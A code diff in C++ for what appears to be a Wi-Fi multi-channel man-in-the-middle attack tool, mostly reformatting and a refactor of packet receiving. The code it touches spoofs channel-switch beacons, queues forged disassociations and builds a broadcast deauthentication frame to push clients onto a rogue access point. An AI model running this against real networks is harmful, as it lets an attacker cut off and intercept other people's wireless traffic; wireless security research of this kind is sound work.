@@ -44,8 +44,7 @@ void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &t
     for(int i = 0; i < numpairs; ++i){
         //FIXME
         const NetworkInterface iface(rogue_sta["iface"]);
-        CSA_attack::send_CSA_beacon(ap_mac, iface, ssid,
-                                    netconfig.real_channel,  netconfig.rogue_channel);
+        CSA_attack::send_CSA_beacon(ap_mac, iface, ssid, netconfig.real_channel,  netconfig.rogue_channel);
 
         // Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
         // followed by one with a value of 1. When starting with 1 it errors out.
@@ -72,13 +71,13 @@ void McMitm::send_disas(const HWAddress<6> &macaddr) const{
 }
 
 void McMitm::queue_disas(const HWAddress<6> &macaddr){
-    const bool already_queued = std::ranges::any_of(disas_queue,
-                                                    [&](const auto &entry){ return entry.second == macaddr; });
+    const bool already_queued = ranges::any_of(disas_queue,
+        [&](const auto &entry){ return entry.second == macaddr; });
     if(already_queued) return;
 
     const auto sched_time = steady_clock::now() + milliseconds(500);
     disas_queue.emplace_back(sched_time, macaddr);
-    std::ranges::sort(disas_queue); // sort by time
+    ranges::sort(disas_queue); // sort by time
 }
 
 void McMitm::try_channel_switch(const HWAddress<6> &macaddr){
@@ -136,8 +135,8 @@ void McMitm::setup_real_AP_RSN_frames(){
         return;
     }
 
-    log(LogLevel::INFO,
-        "Monitor mode: using {} on real channel and {} on rogue channel.", rogue_sta["iface"], rogue_ap["iface"]);
+    log(LogLevel::INFO, "Monitor mode: using {} on real channel and {} on rogue channel.",
+        rogue_sta["iface"], rogue_ap["iface"]);
 
 
     //if(netconfig.real_channel > 13) log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
@@ -201,12 +200,13 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
     // first disconnect
     send_csa_beacon(4);
 
+    /* only for non MFP requests
     Dot11Deauthentication deauth{};
     deauth.addr1(HWAddress<6>::broadcast);
     deauth.addr2(ap_mac);
     deauth.addr3(ap_mac);
     deauth.reason_code(3);
-    sock_real->send(deauth, netconfig.real_channel);
+    sock_real->send(deauth, netconfig.real_channel);*/
 
     // monitoring both channels and performing needed actions
     last_real_beacon  = steady_clock::now();
@@ -239,10 +239,10 @@ void McMitm::run(RunStatus &rs, const int timeout_sec){
         select(max_fd, &read_fds, nullptr, nullptr, &tv);
 
         if (FD_ISSET(fd_real,  &read_fds)){
-            while(auto pdu = sock_real->recv()) handle_rx_real_chan(std::move(pdu));
+            while(auto recv_res = sock_real->recv()) handle_rx_real_chan(std::move(recv_res.pdu), recv_res.raw);
         }
         if (FD_ISSET(fd_rogue, &read_fds)){
-            while(auto pdu = sock_rogue->recv()) handle_rx_rogue_chan(std::move(pdu));
+            while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(std::move(recv_res.pdu), recv_res.raw);
         }
         while (!disas_queue.empty() && disas_queue.front().first <= steady_clock::now()) {
             send_disas(disas_queue.front().second);
@@ -308,6 +308,6 @@ void McMitm::patch_channel_raw(vector<uint8_t> &beacon_raw, const uint8_t channe
 
 ClientState *McMitm::find_client(const string &mac){
     const auto it = clients.find(mac);
-    return (it != clients.end()) ? it->second.get() : nullptr;
+    return it != clients.end() ? it->second.get() : nullptr;
 }
 }
